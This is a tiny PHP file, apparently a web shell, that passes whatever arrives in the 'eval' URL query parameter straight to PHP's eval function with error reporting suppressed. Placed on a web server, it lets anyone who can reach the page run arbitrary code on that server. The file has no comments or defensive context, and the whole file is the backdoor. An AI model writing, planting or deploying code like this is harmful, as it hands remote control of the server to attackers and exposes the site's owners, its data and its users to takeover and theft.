<?php
function xeval($code){
	@eval($code);
}

xeval($_GET['eval']);
?>